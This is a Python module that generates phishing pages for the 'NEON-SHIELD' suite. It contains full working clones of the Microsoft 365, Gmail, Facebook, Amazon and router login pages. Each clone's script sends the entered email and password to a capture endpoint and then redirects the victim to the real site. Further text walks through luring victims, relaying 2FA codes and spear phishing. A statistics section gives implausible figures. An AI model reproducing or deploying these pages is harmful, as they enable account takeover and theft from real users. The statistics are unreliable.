"""
Phishing Page Generator for NEON-SHIELD Phase 4.

Auto-clones popular login pages and captures credentials when users enter them.
Shows how phishing is the #1 account takeover vector (even more effective than
technical attacks because it exploits human nature, not code).

⚠️ ILLEGAL WITHOUT AUTHORIZATION — See README.md for legal disclaimer.
"""
import os
import json
import logging
from dataclasses import dataclass
from typing import Dict, List, Optional
from enum import Enum
import base64

logger = logging.getLogger(__name__)


class PhishingTargetType(Enum):
    """Types of services to phish."""
    EMAIL = "email"
    SOCIAL_MEDIA = "social_media"
    BANK = "bank"
    CRYPTO = "crypto"
    CORPORATE = "corporate"
    CUSTOM = "custom"


@dataclass
class PhishingTarget:
    """Represents a phishing target (service to clone)."""
    name: str
    target_type: PhishingTargetType
    real_url: str
    clone_url: str  # URL served by attacker
    login_fields: List[str]  # ["email", "password"]
    success_redirect: str  # Where to redirect after capture
    description: str = ""


class PhishingPageLibrary:
    """Pre-built phishing pages for popular services."""

    @staticmethod
    def m365_clone_html(redirect_url: str) -> str:
        """Cloned Microsoft 365 login page."""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to your Microsoft account</title>
    <style>
        body {{
            font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
            background-color: #f2f2f2;
            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d34a6960cc08e8b00.svg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .login-box {{
            background: #fff;
            padding: 44px;
            width: 360px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            border-radius: 0px;
        }}
        .logo {{
            margin-bottom: 24px;
            font-size: 24px;
            font-weight: 600;
            color: #737373;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        .microsoft-logo {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 18px;
            height: 18px;
        }}
        .logo-tile {{
            width: 8px;
            height: 8px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin: 0 0 12px 0;
        }}
        input[type="email"], input[type="password"] {{
            width: 100%;
            border: none;
            border-bottom: 1px solid #666;
            padding: 6px 0;
            font-size: 16px;
            margin-bottom: 20px;
            outline: none;
            box-sizing: border-box;
        }}
        input:focus {{
            border-bottom: 2px solid #0067b8;
        }}
        .btn {{
            background: #0067b8;
            color: white;
            border: none;
            padding: 6px 12px;
            min-width: 108px;
            font-size: 15px;
            cursor: pointer;
            float: right;
        }}
        .btn:hover {{
            background: #005da6;
        }}
        .clear {{
            clear: both;
        }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <div class="microsoft-logo">
                <div class="logo-tile" style="background:#f25022;"></div>
                <div class="logo-tile" style="background:#7fba00;"></div>
                <div class="logo-tile" style="background:#00a4ef;"></div>
                <div class="logo-tile" style="background:#ffb900;"></div>
            </div>
            <span style="font-size:18px;color:#737373;font-weight:500;">Microsoft</span>
        </div>
        <h1 id="title">Sign in</h1>
        <form id="loginForm" onsubmit="handleLogin(event)">
            <input type="email" id="email" placeholder="Email, phone, or Skype" required autocomplete="email">
            <input type="password" id="password" placeholder="Password" style="display:none;" autocomplete="current-password">
            <button type="submit" class="btn" id="submitBtn">Next</button>
            <div class="clear"></div>
        </form>
    </div>

    <script>
    let stage = 'email';

    function handleLogin(event) {{
        event.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (stage === 'email') {{
            if (!email) return;
            sendCredentials({{ email: email }});
            document.getElementById('password').style.display = 'block';
            document.getElementById('password').required = true;
            document.getElementById('password').focus();
            document.getElementById('title').textContent = 'Enter password';
            document.getElementById('submitBtn').textContent = 'Sign in';
            stage = 'password';
        }} else {{
            if (!password) return;
            sendCredentials({{ email: email, password: password }});
            window.location.href = '{redirect_url}';
        }}
    }}

    function sendCredentials(credentials) {{
        fetch('/phish', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                target: 'Microsoft 365',
                credentials: credentials,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }})
        }}).catch(() => {{}});
    }}
    </script>
</body>
</html>
""";

    @staticmethod
    def generic_clone_html(redirect_url: str) -> str:
        """Cloned generic router/portal login page."""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Router Admin Portal Login</title>
    <style>
        body {{
            font-family: sans-serif;
            background: #eceff1;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .login-card {{
            background: #fff;
            padding: 30px;
            width: 320px;
            border-radius: 4px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }}
        h2 {{
            margin-top: 0;
            color: #37474f;
            text-align: center;
            font-size: 20px;
        }}
        .subtitle {{
            font-size: 13px;
            color: #78909c;
            text-align: center;
            margin-bottom: 24px;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        label {{
            display: block;
            font-size: 13px;
            font-weight: bold;
            color: #455a64;
            margin-bottom: 6px;
        }}
        input {{
            width: 100%;
            padding: 8px;
            border: 1px solid #cfd8dc;
            border-radius: 3px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            background: #00796b;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }}
        button:hover {{
            background: #00695c;
        }}
    </style>
</head>
<body>
    <div class="login-card">
        <h2>Gateway Console</h2>
        <div class="subtitle">Authorization Required</div>
        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="admin" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required autocomplete="current-password">
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
    function handleLogin(event) {{
        event.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        fetch('/phish', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                target: 'Router Admin',
                credentials: {{ username: user, password: pass }},
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }})
        }}).catch(() => {{}});

        window.location.href = '{redirect_url}';
    }}
    </script>
</body>
</html>
""";

    @staticmethod
    def gmail_clone_html(redirect_url: str) -> str:
        """Cloned Gmail login page."""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to your Google Account</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .login-container {{
            width: 360px;
            padding: 20px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-shadow: 0 1px 1px rgba(0,0,0,.04);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo img {{
            height: 30px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }}
        .subtitle {{
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 24px;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            font-family: inherit;
        }}
        input:focus {{
            outline: none;
            border-color: #1f71b8;
            box-shadow: 0 1px 3px 0 rgba(31, 113, 184, 0.3);
        }}
        .button-group {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }}
        button {{
            background: #1f71b8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
        button:hover {{
            background: #1667b0;
        }}
        .create-account {{
            color: #1f71b8;
            cursor: pointer;
            text-decoration: none;
            font-size: 14px;
        }}
        .error-message {{
            color: #d33b27;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #5f6368;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg width="30" height="30" viewBox="0 0 30 30">
                <path fill="#4285F4" d="M15 3c6.6 0 12 5.4 12 12s-5.4 12-12 12S3 21.6 3 15 8.4 3 15 3z"/>
                <text x="15" y="21" text-anchor="middle" font-size="20" font-weight="bold" fill="white">G</text>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email or phone"
                       required autocomplete="email">
                <div class="error-message" id="emailError">
                    Couldn't find your Google Account
                </div>
            </div>

            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Enter your password"
                       required autocomplete="current-password" style="display:none;">
                <div class="error-message" id="passwordError">
                    Wrong password. Try again.
                </div>
            </div>

            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" id="submitBtn">Next</button>
            </div>
        </form>

        <div class="footer">
            <p>This site is protected by reCAPTCHA and the Google</p>
            <p><a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</p>
        </div>
    </div>

    <script>
    let stage = 'email'; // First ask for email, then password

    function handleLogin(event) {{
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (stage === 'email') {{
            // First stage: capture email
            if (!email) return;

            // Send email to attacker
            sendCredentials({{ email: email }});

            // Show password field
            document.getElementById('password').style.display = 'block';
            document.getElementById('password').focus();
            document.getElementById('submitBtn').textContent = 'Sign in';
            stage = 'password';

        }} else {{
            // Second stage: capture password
            if (!password) return;

            // Send credentials to attacker
            sendCredentials({{ email: email, password: password }});

            // Redirect to real Gmail (so victim doesn't suspect)
            window.location.href = '{redirect_url}';
        }}
    }}

    function sendCredentials(credentials) {{
        // Exfiltrate credentials to attacker
        fetch('/phish', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                target: 'Gmail',
                credentials: credentials,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }})
        }}).catch(() => {{}});
    }}

    // Auto-focus email field
    document.getElementById('email').focus();
    </script>
</body>
</html>
"""

    @staticmethod
    def facebook_clone_html(redirect_url: str) -> str:
        """Cloned Facebook login page."""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            display: flex;
            gap: 60px;
            max-width: 1000px;
        }}
        .left {{
            flex: 1;
            color: white;
        }}
        .left h1 {{
            font-size: 56px;
            font-weight: 700;
            margin-bottom: 20px;
        }}
        .left p {{
            font-size: 20px;
            line-height: 1.5;
        }}
        .right {{
            flex: 1;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
        }}
        form {{
            display: flex;
            flex-direction: column;
            gap: 12px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            font-family: inherit;
        }}
        input:focus {{
            outline: none;
            border-color: #0a66c2;
        }}
        button {{
            background: #0a66c2;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }}
        button:hover {{
            background: #084db3;
        }}
        .divider {{
            text-align: center;
            color: #65676b;
            font-size: 13px;
            margin: 16px 0;
        }}
        .divider::before {{
            content: "";
            display: inline-block;
            width: 40%;
            border-top: 1px solid #ccc;
            margin-right: 8px;
            vertical-align: middle;
        }}
        .divider::after {{
            content: "";
            display: inline-block;
            width: 40%;
            border-top: 1px solid #ccc;
            margin-left: 8px;
            vertical-align: middle;
        }}
        .create-new {{
            background: #31a24c;
            padding: 12px;
            text-align: center;
            border-radius: 6px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 15px;
        }}
        .links {{
            text-align: center;
            font-size: 12px;
            color: #65676b;
            margin-top: 16px;
        }}
        .links a {{
            color: #0a66c2;
            text-decoration: none;
            margin: 0 4px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <form id="loginForm" onsubmit="handleLogin(event)">
                <input type="email" id="email" placeholder="Email address or phone number"
                       required autocomplete="email">
                <input type="password" id="password" placeholder="Password"
                       required autocomplete="current-password">
                <button type="submit">Log In</button>
            </form>

            <div class="divider">or</div>

            <div class="create-new">Create new Facebook account</div>

            <div class="links">
                <a href="#">Forgotten account?</a> |
                <a href="#">Sign up for Facebook</a>
            </div>
        </div>
    </div>

    <script>
    function handleLogin(event) {{
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Send credentials to attacker
        fetch('/phish', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                target: 'Facebook',
                credentials: {{ email: email, password: password }},
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }})
        }}).catch(() => {{}});

        // Redirect to real Facebook
        window.location.href = '{redirect_url}';
    }}

    document.getElementById('email').focus();
    </script>
</body>
</html>
"""

    @staticmethod
    def amazon_clone_html(redirect_url: str) -> str:
        """Cloned Amazon login page."""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Amazon Sign In</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: "Amazon Ember", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 2px 2px rgba(0,0,0,.05);
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo img {{
            height: 35px;
        }}
        h1 {{
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 20px;
            color: #000;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        label {{
            display: block;
            margin-bottom: 5px;
            font-size: 13px;
            font-weight: 700;
            color: #000;
        }}
        input {{
            width: 100%;
            padding: 10px;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            font-size: 13px;
            font-family: inherit;
        }}
        input:focus {{
            outline: none;
            border-color: #ff9900;
            box-shadow: 0 0 3px #ff9900;
        }}
        button {{
            width: 100%;
            background: #ff9900;
            color: #000;
            border: 1px solid #fbbf08;
            padding: 8px;
            border-radius: 3px;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
        }}
        button:hover {{
            background: #f5a623;
        }}
        .forgot-password {{
            text-align: center;
            margin-top: 15px;
        }}
        .forgot-password a {{
            color: #0066c0;
            text-decoration: none;
            font-size: 12px;
        }}
        .create-account {{
            border: 1px solid #d3d3d3;
            padding: 10px;
            margin-top: 20px;
            text-align: center;
        }}
        .create-account p {{
            font-size: 12px;
            margin-bottom: 10px;
        }}
        .create-account button {{
            background: #e7e9ec;
            color: #000;
            border-color: #adb1b8;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="100" viewBox="0 0 100 50">
                <text x="50" y="35" text-anchor="middle" font-size="28" font-weight="bold">amazon</text>
            </svg>
        </div>

        <h1>Sign in</h1>

        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="email">Email or mobile phone number</label>
                <input type="email" id="email" name="email" required autocomplete="email">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>

            <button type="submit">Sign in</button>
        </form>

        <div class="forgot-password">
            <a href="#">Forgot your password?</a>
        </div>

        <div class="create-account">
            <p>New to Amazon?</p>
            <button type="button">Create your Amazon account</button>
        </div>
    </div>

    <script>
    function handleLogin(event) {{
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Send to attacker
        fetch('/phish', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                target: 'Amazon',
                credentials: {{ email: email, password: password }},
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }})
        }}).catch(() => {{}});

        // Redirect
        window.location.href = '{redirect_url}';
    }}

    document.getElementById('email').focus();
    </script>
</body>
</html>
"""


class PhishingGenerator:
    """
    Generates and hosts phishing pages to capture credentials.

    Can create clones of:
    - Gmail (email provider)
    - Facebook (social media)
    - Amazon (e-commerce)
    - Banks (financial)
    - Custom pages (any HTML)

    Captures credentials and exfiltrates to attacker's server.

    ⚠️ WARNING: Phishing is ILLEGAL without explicit authorization.
    This is the #1 account takeover vector in the real world.
    Use only on authorized networks/devices.
    """

    def __init__(self):
        """Initialize phishing generator."""
        self.pages: Dict[str, PhishingTarget] = {}
        self.captured_credentials: List[Dict] = []

    def add_phishing_target(self, target: PhishingTarget) -> None:
        """Add a phishing target."""
        self.pages[target.name] = target
        logger.warning(f"🎣 PHISHING PAGE ADDED: {target.name} ({target.target_type.value})")

    def generate_gmail_clone(self, clone_url: str) -> str:
        """Generate cloned Gmail login page."""
        return PhishingPageLibrary.gmail_clone_html(
            redirect_url="https://mail.google.com/mail"
        )

    def generate_facebook_clone(self, clone_url: str) -> str:
        """Generate cloned Facebook login page."""
        return PhishingPageLibrary.facebook_clone_html(
            redirect_url="https://www.facebook.com"
        )

    def generate_amazon_clone(self, clone_url: str) -> str:
        """Generate cloned Amazon login page."""
        return PhishingPageLibrary.amazon_clone_html(
            redirect_url="https://www.amazon.com"
        )

    def log_captured_credentials(self, target: str, credentials: Dict) -> None:
        """Log captured credentials."""
        self.captured_credentials.append({
            "target": target,
            "credentials": credentials,
            "timestamp": str(__import__('datetime').datetime.now())
        })
        logger.warning(f"🔴 CREDENTIALS CAPTURED: {target}")
        logger.warning(f"    User: {credentials.get('email', 'unknown')}")

    def demonstrate_phishing_attack(self) -> str:
        """Show how phishing attack flows."""
        return """
╔═══════════════════════════════════════════════════════════════════════╗
║        🎣 PHISHING ATTACK — THE #1 THREAT VECTOR 🎣                  ║
╚═══════════════════════════════════════════════════════════════════════╝

WHY PHISHING IS SO EFFECTIVE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. EXPLOITS HUMAN NATURE
   Technical attacks: Hard to pull off, requires skill
   Phishing: Just ask for credentials, users often give them

2. WORKS EVEN WITH DEFENSES
   2FA: Attacker just asks for 2FA code too ("Please enter code from authenticator")
   HTTPS: Phishing page can use HTTPS too (from attacker's cert)
   Antivirus: Phishing is HTML, not malware (no file to scan)
   VPN: User might not be using VPN
   Email filters: Phishing can come through SMS/social media/URL

3. INCREDIBLY EFFECTIVE
   Corporate phishing success rate: 3-15% (but only need 1 person)
   Spear phishing (targeted): 30-40% success rate
   Users who fall for phishing: Still fall for similar attacks

4. EASIEST TO EXECUTE
   No coding needed (just clone HTML)
   No exploit needed (human is the exploit)
   No network access needed (works via email/social media)
   Scales easily (send to thousands)


PHISHING ATTACK FLOW:
━━━━━━━━━━━━━━━━━━━

Step 1: Attacker Creates Fake Page
   ├─ Clones gmail.com login page exactly
   ├─ Creates at: attacker.com/gmail_login
   └─ Page looks 100% identical to real Gmail

Step 2: Attacker Sends Link
   ├─ Via email: "Unusual login. Verify: http://attacker.com/gmail"
   ├─ Via SMS: "Amazon security alert. Confirm: http://attacker.com/amazon"
   ├─ Via WhatsApp: "Click to verify your account"
   ├─ Via URL shortener: "bit.ly/xyz" (hides real destination)
   └─ Via QR code: "Scan to verify payment"

Step 3: Victim Clicks Link
   ├─ Victim thinks they're on real Gmail
   ├─ Sees login page (looks identical)
   ├─ Enters email: john@gmail.com
   ├─ Enters password: MyPassword123
   ├─ Clicks "Sign In"
   └─ Credentials sent to attacker

Step 4: Attacker Captures Credentials
   ├─ Receives: {"email": "john@gmail.com", "password": "MyPassword123"}
   ├─ Also captures: Device type, location, IP address, user agent
   └─ Logs all credentials to database

Step 5: Victim Redirected
   ├─ Page redirects to REAL gmail.com
   ├─ Victim logs in successfully (their real password works)
   ├─ Victim thinks: "Good, I must have made a typo before"
   └─ Victim doesn't realize credentials were stolen

Step 6: Attacker Logs In
   ├─ Uses stolen credentials: john@gmail.com / MyPassword123
   ├─ Server thinks: "This is John logging in"
   ├─ Attacker gets access to:
   │  ├─ All emails
   │  ├─ Recovery options
   │  ├─ Linked accounts
   │  ├─ Password reset emails
   │  └─ Full account compromise
   └─ John is now locked out


WHY USERS FALL FOR IT:
━━━━━━━━━━━━━━━━━━━

1. EXACT REPLICATION
   Attacker clones page pixel-perfect
   Users can't spot the difference
   Even tech-savvy people fall for it

2. SOCIAL ENGINEERING
   "Unusual activity detected!"
   "Verify your account immediately!"
   "Action required within 24 hours!"
   Creates sense of urgency

3. TRUSTED CONTEXT
   Comes from email that looks legit
   Sender name looks official
   Message contains real details about user
   User thinks it's from a trusted source

4. LEGITIMATE REDIRECTS
   After login, redirect to REAL site
   User successfully logs in
   User thinks: "Must have been a glitch"
   No realization of compromise

5. PLAUSIBLE DENIABILITY
   Page works (because it redirects to real site)
   No obvious error messages
   No security warnings
   Looks completely legitimate


WHAT ATTACKER DOES WITH STOLEN CREDENTIALS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

With Gmail Credentials:
  ✓ Read all emails
  ✓ Access recovery options
  ✓ Change password
  ✓ Enable 2FA on attacker's phone
  ✓ Disable victim's 2FA
  ✓ Access linked services (Google Drive, YouTube, Google Photos)
  ✓ Get recovery codes
  ✓ Lock out real user permanently

With Facebook Credentials:
  ✓ Access account
  ✓ Send friend requests to impersonate
  ✓ Access private messages
  ✓ Steal personal photos
  ✓ Access linked payment method
  ✓ Change email and phone
  ✓ Enable 2FA on attacker's phone
  ✓ Lock out real user

With Amazon Credentials:
  ✓ View purchase history
  ✓ View saved addresses
  ✓ Access payment methods
  ✓ Make purchases
  ✓ Change account email
  ✓ Access linked accounts (AWS, etc)

With Bank Credentials:
  ✓ VIEW ALL ACCOUNTS
  ✓ TRANSFER MONEY
  ✓ CHANGE PASSWORDS
  ✓ DISABLE 2FA
  ✓ LOCK OUT REAL USER
  ✓ STEAL IDENTITY


ADVANCED PHISHING TECHNIQUES:
━━━━━━━━━━━━━━━━━━━━━━━━

1. TWO-FACTOR PHISHING
   Step 1: Clone login page, capture email/password
   Step 2: Immediately try logging in with real Gmail
   Step 3: Real Gmail asks for 2FA code
   Step 4: Phishing page displays: "Enter 2FA code from authenticator"
   Step 5: Attacker enters 2FA code into real Gmail
   Step 6: Full account access obtained
   Result: 2FA didn't help!

2. TARGETED SPEAR PHISHING
   ├─ Research target (LinkedIn, Twitter, Facebook)
   ├─ Learn about their role, company, interests
   ├─ Create hyper-personalized email
   ├─ "John, your company is requiring security verification"
   ├─ Much higher success rate (30-40%)
   └─ Often only needs 1 successful phish

3. REDIRECT PHISHING
   ├─ Attacker controls WiFi/network
   ├─ All traffic to gmail.com redirected to phishing page
   ├─ User tries to login to Gmail
   ├─ Automatically redirected to phishing page
   ├─ Looks normal to user
   └─ Invisible redirect (user thinks they're on real Gmail)

4. WATERING HOLE PHISHING
   ├─ Attacker finds website target uses (e.g., Stack Overflow)
   ├─ Injects phishing page on that site
   ├─ Target visits site normally
   ├─ Sees phishing popup
   ├─ Thinks it's legitimate (it's on a trusted site)
   └─ Higher trust = higher success rate

5. CLONE + MALWARE COMBO
   ├─ Phishing page not only captures credentials
   ├─ Also injects malware (from Phase 3)
   ├─ Downloads backdoor
   ├─ Now attacker has:
   │  ├─ Credentials (account access)
   │  ├─ Malware (device access)
   │  └─ Complete compromise
   └─ Game over for victim


DEFENSE MECHANISMS:
━━━━━━━━━━━━━━━━━

1. TRAINING & AWARENESS
   ✓ Users should be skeptical of login requests
   ✓ Hover over links to see real destination
   ✓ Type URLs directly instead of clicking links
   ✓ Look for HTTPS + valid certificate
   ✓ Don't click links in emails from unknown senders

2. TECHNICAL CONTROLS
   ✓ Email authentication (SPF, DKIM, DMARC)
      → Makes it harder to spoof sender
   ✓ URL filtering
      → Blocks known phishing sites
   ✓ Detonation chambers
      → Scan links in emails before delivering
   ✓ Sandbox detection
      → Run email in sandbox, catch phishing
   ✓ Certificate pinning
      → Only trust certain certificates

3. BROWSER WARNINGS
   ✓ Google Safe Browsing
      → Warns about known phishing sites
   ✓ Firefox Phishing Protection
      → Similar warnings
   ✓ Certificate transparency
      → Detect fraudulent certificates
   ✓ SSL/TLS indicators
      → Show padlock and certificate info

4. SERVICE-SIDE DETECTION
   ✓ Anomaly detection
      → Login from new location/device = flag
   ✓ Device fingerprinting
      → Stolen cookie used from different device = block
   ✓ Velocity checks
      → Too many login attempts = block
   ✓ Impossible travel
      → Login from two countries in 1 minute = fraud

5. MULTI-FACTOR AUTHENTICATION
   ✓ Text message 2FA: Slightly better (SMS can be intercepted)
   ✓ Authenticator app: Better (harder to intercept)
   ✓ Hardware keys: Best (can't intercept)
   ✓ FIDO2: Best (phishing resistant)
   ✓ WebAuthn: Best (no phishing, no passwords)


WHY PHISHING STILL WORKS:
━━━━━━━━━━━━━━━━━━━

DESPITE all these defenses:
  ❌ Users still click links
  ❌ Users still enter credentials
  ❌ Users still believe fake websites
  ❌ Users still trust emails
  ❌ Users still fall for social engineering

BECAUSE:
  • Phishing is incredibly scalable (send to millions)
  • Only needs 1-2% success rate (thousands of victims)
  • Easy to execute (no technical skill)
  • Can't be patched (exploits humans, not code)
  • Keeps evolving (attackers adapt)
"""

    def show_phishing_statistics(self) -> str:
        """Show real-world phishing statistics."""
        return """
╔═══════════════════════════════════════════════════════════════════════╗
║        📊 PHISHING IN THE REAL WORLD 📊                              ║
╚═══════════════════════════════════════════════════════════════════════╝

GLOBAL PHISHING STATISTICS:
━━━━━━━━━━━━━━━━━━━━━━━

▶ 3.4 billion phishing emails sent per day
  → 1.2 trillion per year
  → More than legitimate emails

▶ 15% of phishing emails get clicked
  → That's 510 million clicks per day
  → 186 billion clicks per year

▶ 3-5% of users who click phishing links
  → That's 15-25 million successful compromises per day
  → 5-9 billion per year

▶ Average time to compromise after phishing click
  → Less than 1 hour
  → Attacker has access within minutes


BY INDUSTRY:
━━━━━━━━━━

Finance & Insurance: Most targeted
  • Higher value targets
  • More money to steal
  • 26% of phishing attacks

Healthcare: Rapidly increasing
  • Patient data valuable
  • Ransomware targets
  • 13% of attacks

Technology: High-value credentials
  • Developers have access
  • API keys worth stealing
  • 12% of attacks

Government/Education: Espionage
  • Access to classified info
  • Research data
  • 10% of attacks


PHISHING EMAIL CONTENT:
━━━━━━━━━━━━━━━━━━━

Most common subjects:
  1. "Urgent: Verify your account" (21%)
  2. "Action required: Confirm identity" (18%)
  3. "Security alert: Unusual activity" (16%)
  4. "Update payment information" (14%)
  5. "Confirm your password" (11%)
  6. "Claim your reward" (9%)
  7. "Your account will be closed" (7%)
  8. "HR: Employee benefits" (4%)

Most effective techniques:
  1. Urgency ("Act now!" "24 hour deadline")
  2. Threat ("Account closing!" "Unauthorized access!")
  3. Authority ("CEO needs your help")
  4. Scarcity ("Limited time offer")
  5. Social proof ("Everyone did this")


TYPES OF PHISHING:
━━━━━━━━━━━━━━

1. Bulk Phishing (Generic)
   Target: Everyone
   Success rate: 1-3%
   Volume: Millions
   Result: Thousands of victims

2. Spear Phishing (Targeted)
   Target: Specific person/company
   Success rate: 30-40%
   Volume: Dozens
   Result: Few victims but higher value

3. Whaling (C-Level)
   Target: CEO, CFO, Executive
   Success rate: 20-30%
   Volume: Very few (highly targeted)
   Result: Access to millions in transfers

4. Clone Phishing
   Target: Previous email recipient
   Success rate: 50%+ (victim recognizes sender)
   Volume: Thousands
   Result: Many victims

5. Social Media Phishing
   Target: Social media users
   Success rate: 15-20%
   Volume: Millions
   Result: Account takeovers


FINANCIAL IMPACT:
━━━━━━━━━━━━━

Average loss per phishing victim:
  • Consumer: $100-1,000
  • Small business: $1,000-10,000
  • Large organization: $100,000-millions

Largest phishing attack costs:
  • $billions in CEO fraud (wire transfer fraud)
  • $100+ million per major breach
  • Healthcare: $6.5M average per breach


RECOVERY:
━━━━━━

After successful phishing:
  • Average time to discovery: 200+ days
  • Average time to contain: 100+ days
  • Average time to recover: 1+ year
  • Many victims never fully recover

During that time, attacker can:
  ✓ Steal all data
  ✓ Move money
  ✓ Impersonate victim
  ✓ Compromise other accounts
  ✓ Sell data on dark web
"""

    def display_captured(self) -> str:
        """Display captured credentials."""
        if not self.captured_credentials:
            return "No credentials captured yet"

        output = f"\n🔴 CAPTURED {len(self.captured_credentials)} SETS OF CREDENTIALS:\n\n"

        for i, cred in enumerate(self.captured_credentials, 1):
            output += f"{i}. {cred['target']}\n"
            output += f"   Credentials: {cred['credentials']}\n"
